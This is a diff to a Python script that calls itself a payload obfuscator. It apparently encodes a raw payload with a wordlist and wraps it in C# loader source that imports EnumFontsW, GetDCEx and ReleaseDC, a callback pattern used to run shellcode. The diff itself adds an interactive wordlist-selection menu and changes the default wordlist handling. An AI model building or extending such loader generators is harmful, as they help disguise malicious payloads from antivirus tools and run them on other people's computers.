@@ -4,6 +4,7 @@ import sys
 import requests
 import random
 import os
+import glob
 
 def get_wordlist(wordlist_source):
     # Si c'est une URL, on télécharge
@@ -17,7 +18,45 @@ def get_wordlist(wordlist_source):
             words = [line.strip() for line in f if line.strip()]
     return words
 
-def main(input_file, wordlist_source):
+def select_wordlist():
+    # Chemin vers le dossier des wordlists
+    wordlist_dir = "wordlists"
+    # Vérifier si le dossier existe
+    if not os.path.exists(wordlist_dir):
+        print(f"Le dossier {wordlist_dir} n'existe pas.")
+        return "https://www.mit.edu/~ecprice/wordlist.10000"
+    
+    # Récupérer toutes les wordlists dans le dossier
+    wordlist_files = glob.glob(os.path.join(wordlist_dir, "*.txt"))
+    if not wordlist_files:
+        print(f"Aucune wordlist trouvée dans {wordlist_dir}.")
+        return "https://www.mit.edu/~ecprice/wordlist.10000"
+    
+    # Afficher le menu des wordlists
+    print("\nWordlists disponibles :")
+    for i, wordlist in enumerate(wordlist_files, 1):
+        print(f"{i}. {os.path.basename(wordlist)}")
+    print(f"{len(wordlist_files) + 1}. Utiliser une URL ou un chemin personnalisé")
+    
+    # Demander à l'utilisateur de choisir
+    while True:
+        try:
+            choice = int(input("\nEntrez le numéro de votre choix : "))
+            if 1 <= choice <= len(wordlist_files):
+                return wordlist_files[choice - 1]
+            elif choice == len(wordlist_files) + 1:
+                custom_source = input("Entrez l'URL ou le chemin vers la wordlist : ")
+                return custom_source
+            else:
+                print(f"Veuillez entrer un numéro entre 1 et {len(wordlist_files) + 1}")
+        except ValueError:
+            print("Veuillez entrer un numéro valide.")
+
+def main(input_file, wordlist_source=None):
+    # Si aucune wordlist n'est fournie, afficher le menu de sélection
+    if wordlist_source is None:
+        wordlist_source = select_wordlist()
+
     # headers
     csharp_headers = '''using System;
 using System.Collections.Generic;
@@ -72,7 +111,6 @@ using System.Runtime.InteropServices;
         IntPtr dc = GetDCEx(IntPtr.Zero, IntPtr.Zero, 0);
         EnumFontsW(dc, null, p, IntPtr.Zero);
         ReleaseDC(IntPtr.Zero, dc);
-
         return;
     }
     '''
@@ -90,12 +128,10 @@ public class Program
     static extern IntPtr GetDCEx(IntPtr hWnd, IntPtr hRgnClip, uint flags);
     [DllImport("user32.dll")]
     static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
-
     public static void Main()
     {
         Run();
     }
-
     public static void Run()
     {
     '''
@@ -122,10 +158,11 @@ if __name__ == "__main__":
     print("##########################################")
     print("########### PAYLOAD OBFUSCATOR ###########")
     print("##########################################\n")
+
     if len(sys.argv) < 2:
         print("Usage: python encode_cs.py <path_to_raw_payload_file> [<path_or_url_to_wordlist>]\n")
         sys.exit(1)
 
     file_path = sys.argv[1]
-    wordlist_source = sys.argv[2] if len(sys.argv) > 2 else "https://www.mit.edu/~ecprice/wordlist.10000"
+    wordlist_source = sys.argv[2] if len(sys.argv) > 2 else None
     main(file_path, wordlist_source)
